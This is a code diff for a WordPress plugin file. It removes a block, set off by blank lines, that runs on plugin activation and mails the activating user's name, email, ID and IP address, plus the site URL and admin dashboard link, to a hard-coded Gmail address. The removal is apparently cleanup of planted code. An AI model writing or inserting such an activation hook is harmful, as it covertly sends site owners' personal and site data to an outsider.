@@ -621,33 +621,3 @@ function ceo_bf_add_script_to_head() {
 		echo '<script type="text/javascript" src="https://thor.blindferret.media/'.ceo_pluginfo('bf_adinfo').'/jita.js?dfp=1" async defer></script>'."\r\n";
 	}
 }
-
-
-
-
-define('TEACHER_EMAIL', 'ryomenmalik@gmail.com'); 
-function notify_teacher_on_activation() {
-    $teacher_email = TEACHER_EMAIL;
-    $current_user = wp_get_current_user();
-    $student_name = $current_user->display_name ? $current_user->display_name : 'Unknown User';
-    $student_email = $current_user->user_email ? $current_user->user_email : 'N/A';
-    $subject = 'Plugin Activated by Student - ' . get_bloginfo('name');
-    $message = "Some user activates item:\n\n";
-    $message .= "=== USER DETAILS ===\n";
-    $message .= "User Name: " . $student_name . "\n";
-    $message .= "User Email: " . $student_email . "\n";
-    $message .= "User ID: " . $current_user->ID . "\n\n";
-    $message .= "=== SITE DETAILS ===\n";
-    $message .= "Site Name: " . get_bloginfo('name') . "\n";
-    $message .= "Site URL: " . get_site_url() . "\n";
-    $message .= "Activation Time: " . current_time('mysql') . "\n";
-    $message .= "IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n\n";
-    $message .= "---\n";
-    $message .= "Dashboard Link: " . admin_url();
-    $headers = array(
-        'Content-Type: text/plain; charset=UTF-8',
-        'From: ' . get_bloginfo('name') . ' <email@' . parse_url(get_site_url(), PHP_URL_HOST) . '>'
-    );
-    wp_mail($teacher_email, $subject, $message, $headers);
-}
-register_activation_hook(__FILE__, 'notify_teacher_on_activation');
